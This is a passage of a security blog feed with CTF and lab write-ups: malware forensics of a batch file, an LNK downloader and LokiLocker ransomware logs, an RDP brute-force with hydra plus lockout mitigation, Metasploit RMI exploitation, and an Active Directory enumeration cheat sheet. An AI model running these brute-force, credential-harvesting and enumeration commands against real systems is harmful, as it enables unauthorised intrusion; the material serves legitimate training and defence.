    <content type="html"><![CDATA[<p><img src="https://i.imgur.com/GMsEYt3.png"></p><p>Hi üëã, in this article i‚Äôll be sharing some challenges from the hacktheboo ctf challenges that was up i covered 3 challenges didn‚Äôt touch on the rest that much. So for the first bat challenge it was under the practice section and the last two are forensics which i decided to work on they were interesting. </p><p>Hope you have a nice read üòÖ</p><h2 id="Bat-Problems"><a href="#Bat-Problems" class="headerlink" title="Bat Problems"></a>Bat Problems</h2><h3 id="Explanation"><a href="#Explanation" class="headerlink" title="Explanation"></a>Explanation</h3><p>We are given the following file:</p><ul><li><code>payload.bat</code>: Malicious bat file.</li></ul><p>As we can see from the following image, the bat script contains many random variables that are assigned random values. In a batch script (a .bat or .cmd file), the set command defines and manipulates environment variables which store information that can be used by the script or other programs running in the same environment (the Command Prompt session).</p><p><img src="https://i.imgur.com/6Ila1bK.png"></p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>First, the bat file can be analyzed using <code>Any.Run</code> which is a malware analyzer tool.<br>We will get the following result if we upload the sample on the aforementioned site.</p><p><img src="https://i.imgur.com/qHgSgit.png"></p><p>By analyzing the behavior graph, we notice three actions made:</p><ol><li>The attacker can be seen using <code>cmd</code> to copy PowerShell to a different path with a random name (Earttxmxaqr.png). </li><li>The attacker then uses cmd again to rename the downloaded bat file and also change it‚Äôs extension to <code>.png.bat</code> to avoid detection.</li><li>The attacker executes the base64 encoded string using the renamed PowerShell executable (<code>-enc</code> argument in Powershell is used to pass a base64 encoded command).</li></ol><p><img src="https://i.imgur.com/TnYjjwM.png"></p><p>By decoding the string, the flag can be retrieved.</p><p><img src="https://i.imgur.com/yXGbDwO.png"></p><h2 id="Trick-or-Treat"><a href="#Trick-or-Treat" class="headerlink" title="Trick or Treat"></a>Trick or Treat</h2><h3 id="Explanation-1"><a href="#Explanation-1" class="headerlink" title="Explanation"></a>Explanation</h3><p>We are given the following file:</p><ul><li><code>capture.pcap</code>: Packet capture file</li><li><code>trick_or_treat.lnk</code>: The malicious file</li></ul><p>Since the malicious file is provided by HTB, we can first gain additional information on it through <code>VirusTotal</code>, a famous OSINT website. After scanning, the file shows that it is indeed malicious and it connects to a malicious domain called <code>windowsliveupdater.com</code>. We also can notice that the file is connected to a few IP addresses, mainly <code>209.197.3.8</code> which is the malicious one.</p><p><img src="https://i.imgur.com/2D3e9x9.png"></p><p>Analyzing further, we can understand what kind of processes are executed by the malicious file and how it attacks a system.</p><p>As shown in the picture below, the malicious file seems to download malicious data from <code>http://windowsliveupdater.com</code> using a random User-Agent for HTTP requests to essentially mask its identity on the network. It then sets the downloaded data into a variable (<code>$vurnwos</code>) and processes the characters in pairs and converts them from hexadecimal representation to their actual characters. It then performs a bitwise XOR operation with <code>0x1d</code> on each character and the output is appended to the <code>$vurnwos</code> string. Finally, it executes the variable using <code>Invoke-Command</code>. It also attempts to execute an empty variable (<code>$asvods</code>).</p><p><img src="https://i.imgur.com/CCvPfrn.png"></p><p>After knowing what the malicious file does, the packet capture file can be analyzed using Wireshark to find the downloaded content. Since we know that the malicious file requested data from a website, we can filter <code>HTTP</code> packets only.</p><p><img src="https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf4.png"></p><p>Going through the HTTP packets, we find a packet that shows the victim sending a GET request to <code>http://windowsliveupdater.com</code>. Analyzing the <code>User-Agent</code>, we can see that it is one of the randomized user agents set in the malicious file.</p><p><img src="https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf5.png"></p><p>Now we know that that the IP address <code>77.74.198.52</code> is responsible for the malicious file execution, we can check its HTTP response. Notice that the HTTP response packet has a cleartext data that is truncated because it is too long for Wireshark. The data is our key to getting the flag and it must be extracted using the decoding method specified in the malicious file.</p><p><img src="https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf6.png"></p><p><img src="https://i.imgur.com/DcWJVAU.png"></p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>Since we know that the downloable content is encoded in hex and also XOR‚Äôed using this key <code>0x1d</code>, we can use <code>CyberChef</code> to extract the content.</p><p><img src="https://i.imgur.com/kk8AUa1.png"></p><h2 id="ValHalloween"><a href="#ValHalloween" class="headerlink" title="ValHalloween"></a>ValHalloween</h2><h3 id="Explanation-2"><a href="#Explanation-2" class="headerlink" title="Explanation"></a>Explanation</h3><p>We are given the following file:</p><ul><li><code>Logs</code>: Directory containing various Windows XML EventLog (.evtx) files</li></ul><p>In this challenge, we are given a series of questions that must be answered to obtain the flag. These answers can all be located in certain event log files provided by HTB.</p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><ol><li>What are the IP address and port of the server from which the malicious actors downloaded the ransomware? (for example: 98.76.54.32:443)</li></ol><ul><li>Answer: <code>103.162.14.116:8888</code></li></ul><p>To complete this question, we can analyze the <code>Security</code> log file and filter the logs with event ID 4688 which is normally logged in Event Viewer when a new process is created. After filtering the results, we find a Powershell script that was executed to download the ransomware (‚Äòmscalc.exe‚Äô) from a malicious server with its IP address and port. Additionally, we now know the estimated time of the ransomware attack is around 11:03:24 AM on 20&#x2F;9&#x2F;2023.</p><p><img src="https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win2.png"></p><ol start="2"><li>According to the sysmon logs, what is the MD5 hash of the ransomware? (for example: 6ab0e507bcc2fad463959aa8be2d782f)</li></ol><ul><li>Answer: <code>B94F3FF666D9781CB69088658CD53772</code></li></ul><p>To complete this question, we can analyze the <code>sysmon</code> log file and filter the logs with event ID 1 which is normally logged in Event Viewer when a new process is created. After filtering the results and since we know the Powershell script downloads the ransomware, we can attempt to find its child processes to locate the creation process of the ransomware. After analyzing the logs, we can find the ransomware with its MD5 hash.</p><p><img src="https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win3.png"></p><ol start="3"><li>Based on the hash found, determine the family label of the ransomware in the wild from online reports such as Virus Total, Hybrid Analysis, etc. (for example: wannacry)</li></ol><ul><li>Answer: <code>lokilocker</code></li></ul><p>To complete this question, just put the ransomware‚Äôs MD5 hash to any OSINT tool and check its family labels.</p><p><img src="https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win4.png"></p><ol start="4"><li>What is the name of the task scheduled by the ransomware? (for example: WindowsUpdater)</li></ol><ul><li>Answer: <code>Loki</code></li></ul><p>To complete this question, we can analyze the <code>sysmon</code> log file and filter the logs with keyword ‚Äòschtasks‚Äô which is the name for task scheduling process. After filtering the results, we find a schtasks program with the parent process being the ransomware.</p><p><img src="https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win5.png"></p><ol start="5"><li>What are the parent process name and ID of the ransomware process? (for example: svchost.exe_4953)</li></ol><ul><li>Answer: <code>powershell.exe_3856</code></li></ul><p>To complete this question, we can analyze the <code>sysmon</code> log file and check the ransomware process again. Viewing the XML format of the ransomware process, we can easily find the parent process name and ID of the ransomware process.</p><p><img src="https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win6.png"></p><ol start="6"><li>Following the PPID, provide the file path of the initial stage in the infection chain. (for example: D:\Data\KCorp\FirstStage.pdf)</li></ol><ul><li>Answer: <code>C:\Users\HoaGay\Documents\Subjects\Unexpe.docx</code></li></ul><p>To complete this question, we can analyze the <code>Security</code> log file again and check the Powershell script process again. As the question suggests, we can use the PPID to retrace the steps to the initial stage in the infection chain. As shown in the pictures below, we then stumble upon a malicious <code>.docx</code> file</p><p><img src="https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win7.png"></p><p><img src="https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win8.png"></p><p><img src="https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win9.png"></p><ol start="7"><li>When was the first file in the infection chain opened (in UTC)? (for example: 1975-04-30_12:34:56)</li></ol><ul><li>Answer: <code>2023-09-20_03:03:20</code></li></ul><p>To complete this question, we can just view the XML format of the <code>.docx</code> file and find the <code>TimeCreated SystemTime</code> row. ENSURE THE TIME FORMAT IS IN UTC!</p><p><img src="https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win10.png"></p>]]></content>
    
    
    <summary type="html">Challenges Writeup</summary>
    
    
    
    <category term="Writeups" scheme="https://malw0re.github.io/categories/Writeups/"/>
    
    
    <category term="ctf" scheme="https://malw0re.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>INSECURE RDP</title>
    <link href="https://malw0re.github.io/2023/10/13/insecure-rdp/"/>
    <id>https://malw0re.github.io/2023/10/13/insecure-rdp/</id>
    <published>2023-10-13T14:21:14.000Z</published>
    <updated>2025-07-09T18:12:01.002Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Objective:</strong>¬†</p><p>Exploit the application and retrieve the flag!</p><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Running nmap on our target, we see there‚Äôs a distinct port <code>3333</code> with a very peculiar service <code>dec-notes</code>. Our focus primarily will be exploiting the insecure rdp service.</p><p><img src="https://i.imgur.com/I1s9edD.png"></p><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>To confirm if the target is running rdp we‚Äôll use a metasploit module called <code>rdp-scanner</code> what it does is it attempts to connect to the specified RDP port and determines if it <em>‚Äúspeaks‚Äù</em> RDP. </p><p>Setting up the required variables for the module, we get an interesting response it‚Äôs running RDP!!</p><p><img src="https://i.imgur.com/54Cb8jL.png"></p><h3 id="Bruteforcing-credentials"><a href="#Bruteforcing-credentials" class="headerlink" title="Bruteforcing credentials"></a>Bruteforcing credentials</h3><p>But for us to get the flag we need credentials that we can login in using rdp to get the flag, for that we‚Äôll need to bruteforce some credentials.</p><p>We‚Äôll need to use hydra for this bruteforce.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.6.23.164:3333 </span><br></pre></td></tr></table></figure><p>So basically the commands takes in a user and a password wordlist to bruteforce against the rdp service with the specified port number during enumeration.</p><p>As we can see immediately we get some credentials that we can try logging in with, the account administrator seems perfect cause it has more privileges as compared to the rest so we‚Äôll login with that one to get the flag.</p><p><img src="https://i.imgur.com/qtz5e8G.png"></p><h4 id="N-B"><a href="#N-B" class="headerlink" title="N|B"></a><em>N|B</em></h4><p>during an engagement it‚Äôs necessary to check or limit the bruteforce speed as not to cause a denial of service on the service you are pentesting.</p><h3 id="RDP-login"><a href="#RDP-login" class="headerlink" title="RDP login"></a>RDP login</h3><p>Having enumerated some credentials, we can login via rdp using the xfreerdp tool since that‚Äôs what is installed in this instance i have, but there are many tools out there that you can use to login via rdp.</p><p>Moving forward we‚Äôll login via xfreerdp.</p><p><img src="https://i.imgur.com/Gp5D6kn.png"></p><p><img src="https://i.imgur.com/LvnIpr5.png"></p><p>We see we have a GUI instance of RDP connection on the target machine, now we can fetch the flag from the C:&#x2F; drive.</p><p><img src="https://i.imgur.com/VWadcyX.png"></p><h3 id="Mitigation-Against-Bruteforce"><a href="#Mitigation-Against-Bruteforce" class="headerlink" title="Mitigation Against Bruteforce"></a>Mitigation Against Bruteforce</h3><p>The Bruteforce attack that we just performed can be mitigated. It requires the creation of an Account Policy that will prevent Hydra or any other tool from trying multiple credentials. It is essentially a Lockout Policy. To toggle this policy, we need to open the Local Security Policy window. This can be done by typing <strong>‚Äúsecpol.msc‚Äù</strong>. </p><p>Checking out the Account policy we can see there no policies implemented which falls under misconfigurations which lead to such exploitations.</p><p><img src="https://i.imgur.com/8XxUKeD.png"></p><p>To get to the particular policy we need to Account Policies under Security Settings. Inside the Account Policies, there exists an Account Lockout Policy. It contains 3 policies each working on an aspect of the Account Lockout. </p><p>The first one controls the duration of the lockout. This is the time that is required to be passed to log in again after the lockout. Then we have the Lockout Threshold. This controls the number of invalid attempts. Please toggle these as per your requirements. This should prevent the Bruteforce attack.</p><p><img src="https://i.imgur.com/vNRevnq.png"></p><p>After trying the Bruteforce attack using Hydra, it can be observed that it is not possible to extract the credentials as before. Although there is still some risk that can be prevented by forcing the users to change the passwords frequently and enforcing good password policies.</p><p><img src="https://i.imgur.com/YwhqTHW.png"></p><p>As we enabled a lockout policy, we will not be able to log in on the machine even with the correct password until the time passed that we toggled in the policy. </p>]]></content>
    
    
    <summary type="html">Exploiting insecure RDP Services</summary>
    
    
    
    <category term="Writeups" scheme="https://malw0re.github.io/categories/Writeups/"/>
    
    
    <category term="rdp" scheme="https://malw0re.github.io/tags/rdp/"/>
    
  </entry>
  
  <entry>
    <title>MSF CTF II</title>
    <link href="https://malw0re.github.io/2023/10/05/metasploit-2/"/>
    <id>https://malw0re.github.io/2023/10/05/metasploit-2/</id>
    <published>2023-10-05T00:00:00.000Z</published>
    <updated>2025-07-09T18:12:01.002Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CTF-Scenario"><a href="#CTF-Scenario" class="headerlink" title="CTF Scenario."></a>CTF Scenario.</h2><ul><li>This lab is dedicated to you! No other users are on this network</li><li>Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z.</li><li>The lab has two target machines which should be located on the same subnet¬† i.e. 192.X.Y.0&#x2F;24</li><li>The target systems most of times, belong to ‚Äúadmin‚Äù or ‚Äúroot‚Äù user.</li></ul><h1 id="Flags"><a href="#Flags" class="headerlink" title="Flags."></a>Flags.</h1><ul><li>This lab has only 1 Flag to be collected.</li><li>The Flag can be identified either by the strings flag, flagX, FLAG, FLAGX.</li></ul><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Get the IP for the target we need to compromise, the run some nmap on them.<br><img src="https://i.imgur.com/Oi76QKA.png"><br><img src="https://i.imgur.com/831j10q.png"></p><h2 id="Target-1"><a href="#Target-1" class="headerlink" title="Target 1"></a>Target 1</h2><p>Checking off the scan from <code>target-1</code> we can see it‚Äôs running an outdated version of Werkzeug, a utility library for Python that provides tools and libraries for building web applications hence vulnerable to remote code execution. </p><p>Hoping on metasploit we find the module that can exploit the outdated version.<br><img src="https://i.imgur.com/dBobIFE.png"></p><p>To be continued ‚Ä¶‚Ä¶</p>]]></content>
    
    
    <summary type="html">Metasploit ctf series two</summary>
    
    
    
    <category term="Writeups" scheme="https://malw0re.github.io/categories/Writeups/"/>
    
    
    <category term="Metasploit-ctf" scheme="https://malw0re.github.io/tags/Metasploit-ctf/"/>
    
  </entry>
  
  <entry>
    <title>MSF CTF</title>
    <link href="https://malw0re.github.io/2023/09/15/metasploit-1/"/>
    <id>https://malw0re.github.io/2023/09/15/metasploit-1/</id>
    <published>2023-09-15T11:30:03.000Z</published>
    <updated>2025-07-09T18:12:01.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Metasploit-ctf-I-easy"><a href="#Metasploit-ctf-I-easy" class="headerlink" title="Metasploit ctf I (easy)"></a>Metasploit ctf I (<em>easy</em>)</h1><h3 id="CTF-Scenario"><a href="#CTF-Scenario" class="headerlink" title="CTF Scenario:"></a>CTF Scenario:</h3><ul><li>This lab is dedicated to you! No other users are on this network :)</li><li>Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z.</li><li>The lab has two target machines which should be located on the same subnet¬† i.e. 192.X.Y.0&#x2F;24</li><li>The target systems most of times, belong to ‚Äúadmin‚Äù or ‚Äúroot‚Äù user.</li><li>Do not attack the gateway located at IP address 192.X.Y.1</li><li>You can use all tools installed in Kali to complete this lab.</li></ul><h2 id="Flags"><a href="#Flags" class="headerlink" title="Flags:"></a>Flags:</h2><ul><li>This lab has only 1 Flag to be collected.</li><li>The Flag can be identified either by the strings flag, flagX, FLAG, FLAGX.</li><li>The Flag can either be a normal string or a 32-character random Hex string.</li></ul><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>checking our network interfaces, with <code>ip a s</code> this is a command used to display info about the network interfaces on the system.</p><p><img src="https://i.imgur.com/Q3nW1a4.png"></p><p>Having identified our target <code>target-1</code>, &amp; <code>target-2</code> , our aim is to exploit the two boxes, so running an nmap scan we see <code>target-1</code> is running <code>rmiregistry</code> on port 1909 and <code>target-2</code> is running ssh.</p><p><img src="https://i.imgur.com/Vzu6BCd.png"></p><p>What is <em><strong>rmiregistry</strong></em>? it‚Äôs a tool in Java used for Remote Method Invocation to manage and look up remote objects on a network,<em>RMI</em> in java allows objects in one Java Virtual Machine to invoke methods on objects residing in another JVM, another remote machine.<br>This provides a way for Java applications to communicate and interact across a network.[<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html]">https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html]</a>(read more)</p><h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><p>since it‚Äôs a metasploit ctf we need to check out for some exploit. </p><p>We find a module that take advantage of the deault configuration of the RMI registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. </p><p>As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. </p><p>RMI method calls do not support or  require any sort of authentication.</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>So, loading up everything on metasploit, running the module we get a shell back</p><p><img src="https://i.imgur.com/Le8fCAn.png"></p><p>stabilizing our shell we go to the home directory under the folder alice there is some ssh keys that we can use and login with since we are already root.</p><p><img src="https://i.imgur.com/LUcKnZZ.png"></p><p>so, having known where the ssh keys are we can background our sessions and use the ssh_creds metasploit module.</p><h2 id="flag"><a href="#flag" class="headerlink" title="flag."></a>flag.</h2><p>the ssh_creds metasploit module, it will collect the contents of all users‚Äô .ssh directories on the targeted machine.</p><p><img src="https://i.imgur.com/Feds9zY.png"></p><p>After which we can use the ssh_login module to login into the machine <em>target-2</em>, we are using the login_pubkey cause of the public key we got on the alice folder.</p><p><img src="https://i.imgur.com/8bo6jEO.png"></p><p><strong>N|B</strong> </p><p>I set the rhost to the machine that we are targeting <em>target-2</em> which is the ip with the <em>.4</em>.</p><p>Checking our sessions we see that we have a new session created and we got the flag.</p><p><img src="https://i.imgur.com/vsZZTmU.png"></p><p><img src="https://i.imgur.com/7rV9TRB.png"><br><img src="https://i.imgur.com/BDHEMIo.png"></p>]]></content>
    
    
    <summary type="html">Metasploit ctf series</summary>
    
    
    
    <category term="Writeups" scheme="https://malw0re.github.io/categories/Writeups/"/>
    
    
    <category term="Metasploit-ctf" scheme="https://malw0re.github.io/tags/Metasploit-ctf/"/>
    
  </entry>
  
  <entry>
    <title>AD CRED ENUM</title>
    <link href="https://malw0re.github.io/2023/08/09/ad-credential-enumeration/"/>
    <id>https://malw0re.github.io/2023/08/09/ad-credential-enumeration/</id>
    <published>2023-08-09T00:00:00.000Z</published>
    <updated>2025-07-09T18:12:01.002Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://miro.medium.com/v2/resize:fit:750/0*Kz1iA9w7Ciywdu1A.jpg"></p><h2 id="Credential-Enumeration"><a href="#Credential-Enumeration" class="headerlink" title="Credential Enumeration"></a>Credential Enumeration</h2><p>After acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:</p><ul><li>Domain users</li><li>Computer Attributes</li><li>group membership</li><li>Group Policy Objects</li><li>Permissions</li><li>ACLs</li><li>Trusts</li></ul><p>but not limited to the above, but the most <strong>important thing to remember is that most of these tools will not work without domain users‚Äô credentials at any permission level.</strong></p><p>So at a minimum, you need to have acquired a user‚Äôs cleartext password, NTLM password hash or SYSTEM access on a domain-joined host.</p><h2 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec."></a>CrackMapExec.</h2><p>This tool can be used to assess AD environments, where it utilizes packages from the impacket and powersploit toolkit to perform its functions.</p><h3 id="Domain-UserEnum"><a href="#Domain-UserEnum" class="headerlink" title="Domain UserEnum"></a>Domain UserEnum</h3><p>When enumerating you need to point CME to the Domain Controller, using creds that you retrieved you can list out domain users, it is noted that CME provides a <strong><strong><strong><strong><strong>badPwdCount</strong></strong></strong></strong></strong> attribute which is helpful when performing targeted pass spraying or building a target users list filtered out with user badPwdCount attribute that‚Äôs above 0 to be careful not to lock out accounts.</p><p><code>sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --users</code></p><h3 id="Domain-Group-Enum"><a href="#Domain-Group-Enum" class="headerlink" title="Domain Group Enum"></a>Domain Group Enum</h3><p>We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.</p><p><code>sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx</code>  <code>--groups</code> </p><p>We can begin to note down groups of interest. Take note of key groups like¬†<code>Administrators</code>,¬†<code>Domain Admins</code>,¬†<code>Executives</code>, any groups that may contain privileged IT admins, etc. These groups likely contain users with elevated privileges worth targeting during our assessment.</p><h2 id="Smbmap"><a href="#Smbmap" class="headerlink" title="Smbmap"></a>Smbmap</h2><p>A tool for enumerating SMB shares from a Linux environment can be used to list shares, permissions and share content. </p><h3 id="recursive-list-Dirs-in-Shares"><a href="#recursive-list-Dirs-in-Shares" class="headerlink" title="recursive list Dirs in Shares"></a>recursive list Dirs in Shares</h3><p><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#39;Department Shares&#39; --dir-only</code></p><h2 id="RpcClient"><a href="#RpcClient" class="headerlink" title="RpcClient"></a>RpcClient</h2><p>Used to enumerate, add, change and even remove objects from AD.</p><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers">Relative Identifier (RID)</a> is a unique identifier utilized to track and identify objects, for example:</p><ul><li><p>The¬†<a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers">SID</a>¬†for the INLANEFREIGHT.LOCAL domain is:¬†<code>S-1-5-21-3842939050-3880317879-2865463114</code>.</p></li><li><p>When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.</p></li><li><p>So the domain user¬†<code>htb-student</code>¬†with a RID:[0x457] Hex 0x457 would &#x3D; decimal¬†<code>1111</code>, will have a full user SID of¬†<code>S-1-5-21-3842939050-3880317879-2865463114-1111</code>.</p></li><li><p>This is unique to the¬†<code>htb-student</code>¬†object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.</p></li></ul><p>Some accounts will have the same RID regardless of what host you are on, built-in admin accounts for domains will have <strong>500</strong> or <strong>0x1f4</strong> this value is unique to an object hence we can use it to enumerate further info from the domain.</p><h2 id="Impacket-Toolkit"><a href="#Impacket-Toolkit" class="headerlink" title="Impacket-Toolkit"></a>Impacket-Toolkit</h2><p>impacket is a versatile toolkit which gives different ways to enumerate, interact and exploit Windows protocols and find the information needed using Python. </p><h3 id="Psexec-py"><a href="#Psexec-py" class="headerlink" title="Psexec.py"></a>Psexec.py</h3><p>A clone of sysinternals psexec executable works by creating a remote service by uploading a randomly-named executable to the ADMIN$ shares on the target host and registers the service via RPC and the Windows services control manager.</p><p>Once comms are established it provides a shell as a SYSTEM on the victim host.</p><h3 id="windapsearch"><a href="#windapsearch" class="headerlink" title="windapsearch"></a>windapsearch</h3><p><a href="https://github.com/ropnop/windapsearch">Windapsearch</a> is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries, we can also perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The¬†<code>--da</code>(enumerate domain admins group members ) option and the¬†<code>-PU</code>( find privileged users) options. The¬†<code>-PU</code>¬†option is interesting because it will perform a recursive search for users with nested group membership.</p><h3 id="Domain-Admins"><a href="#Domain-Admins" class="headerlink" title="Domain-Admins"></a>Domain-Admins</h3><p><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</code></p><p>This enumerates Domain Admin Groups.</p><h3 id="Privileged-Users"><a href="#Privileged-Users" class="headerlink" title="Privileged Users"></a>Privileged Users</h3><p>Checking for potential users, using <strong>-PU</strong> with elevated privileges that may have gone unnoticed.</p><p><strong>N&#x2F;B This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.</strong></p><p><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</code></p><h2 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h2><p>Once you have the domain credentials, you can run <a href="https://github.com/fox-it/BloodHound.py">BloodHound.py</a> a tool for auditing Active Directory where it takes large amounts of data that would be time-consuming to sift through and create a GUI representation or ‚Äúattack paths‚Äù of where access with a particular user may lead.</p><ul><li><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3></li></ul><p>At this point, we are interested in other misconfiguration and permission issues that could lead to lateral and vertical movement, getting the bigger picture of how the domain is setup</p><ul><li>Do any trusts exist with other domains both inside &amp; outside the current forest?</li><li>Files shares that our user has access to.</li></ul><h2 id="ActiveDirectory-Powershell-Modules"><a href="#ActiveDirectory-Powershell-Modules" class="headerlink" title="ActiveDirectory Powershell Modules"></a>ActiveDirectory Powershell Modules</h2><p>These are groups of Powershell cmdlets for enumerating AD environments.</p><p><code>Get-ADDomain</code> - Print out domain SID, domain functional level, and child domains.</p><p><code>Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName</code> This will filter ACC with the <strong>serviceprincipalname</strong> property populated and also get us a listing ACC that may be susceptible to kerberos attacks.</p><p><code>Get-ADTrust -Filter *</code> - prints out any trust relationship the domain has, it‚Äôs useful when looking at how to take advantage of the child-to-parent trust relationship and attack across forest trusts.</p><p><code>Get-ADGroup -Filter * | select name</code> - Group enumeration</p><p><code>Get-ADGroup -Identity &quot;Backup Operators&quot;</code> - Detailed Group Info</p><p><code>Get-ADGroupMember -Identity &quot;Backup Operators&quot;</code> - Getting Group Membership</p><h2 id="Powerview"><a href="#Powerview" class="headerlink" title="Powerview"></a>Powerview</h2><p>It identifies where users are logged in on a network, enumerates domain info such as users, computers, groups, ACLs, and trusts, hunts for file shares and passwords, performs Kerberoasting and more.</p><p>It gives an insight into the security posture of the target domain. </p><ul><li><h3 id="commands"><a href="#commands" class="headerlink" title="commands"></a>commands</h3></li></ul><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td>Export-PowerViewCSV</td><td>Append results to a CSV file</td></tr><tr><td>ConvertTo-SID</td><td>Convert a User or group name to its SID value</td></tr><tr><td>Get-DomainSPNTicket</td><td>Requests the Kerberos ticket for a specified Service Principal Name (SPN) account</td></tr><tr><td><strong>Domain&#x2F;LDAP Functions</strong></td><td></td></tr><tr><td>Get-Domain</td><td>Will return the AD object for the current (or specified) domain</td></tr><tr><td>Get-DomainController</td><td>Return a list of the Domain Controllers for the specified domain</td></tr><tr><td>Get-DomainUser</td><td>Will return all users or specific user objects in AD</td></tr><tr><td>Get-DomainComputer</td><td>Will return all computers or specific computer objects in AD</td></tr><tr><td>Get-DomainGroup</td><td>Will return all groups or specific group objects in AD</td></tr><tr><td>Get-DomainOU</td><td>Search for all or specific OU objects in AD</td></tr><tr><td>Find-InterestingDomainAcl</td><td>Finds object ACLs in the domain with modification rights set to non-built in objects</td></tr><tr><td>Get-DomainGroupMember</td><td>Will return the members of a specific domain group</td></tr><tr><td>Get-DomainFileServer</td><td>Returns a list of servers likely functioning as file servers</td></tr><tr><td>Get-DomainDFSShare</td><td>Returns a list of all distributed file systems for the current (or specified) domain</td></tr><tr><td>GPO Functions:</td><td></td></tr><tr><td>Get-DomainGPO</td><td>Will return all GPOs or specific GPO objects in AD</td></tr><tr><td>Get-DomainPolicy</td><td>Returns the default domain policy or the domain controller policy for the current domain</td></tr><tr><td><strong>Computer Enumeration Functions</strong>:</td><td></td></tr><tr><td>Get-NetLocalGroup</td><td>Enumerates local groups on the local or a remote machine</td></tr><tr><td>Get-NetLocalGroupMember</td><td>Enumerates members of a specific local group</td></tr><tr><td>Get-NetShare</td><td>Returns open shares on the local (or a remote) machine</td></tr><tr><td>Get-NetSession</td><td>Will return session information for the local (or a remote) machine</td></tr><tr><td>Test-AdminAccess</td><td>Tests if the current user has administrative access to the local (or a remote) machine</td></tr><tr><td><strong>Threaded ‚ÄòMeta‚Äô-Functions</strong></td><td></td></tr><tr><td>Find-DomainUserLocation</td><td>Finds machines where specific users are logged in</td></tr><tr><td>Find-DomainShare</td><td>Finds reachable shares on domain machines</td></tr><tr><td>Find-InterestingDomainShareFile</td><td>Searches for files matching specific criteria on readable shares in the domain</td></tr><tr><td>Find-LocalAdminAccess</td><td>Find machines on the local domain where the current user has local administrator access</td></tr><tr><td><strong>Domain Trust Functions</strong></td><td></td></tr><tr><td>Get-DomainTrust</td><td>Returns domain trusts for the current domain or a specified domain</td></tr><tr><td>Get-ForestTrust</td><td>Returns all forest trusts for the current forest or a specified forest</td></tr><tr><td>Get-DomainForeignUser</td><td>Enumerates users who are in groups outside of the user‚Äôs domain</td></tr><tr><td>Get-DomainForeignGroupMember</td><td>Enumerates groups with users outside of the group‚Äôs domain and returns each foreign member</td></tr><tr><td>Get-DomainTrustMapping</td><td>Will enumerate all trusts for the current domain and any others seen.</td></tr></tbody></table><p><strong>Domain User Info</strong>        </p><p><code>Get-DomainUser -Identity morgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname, 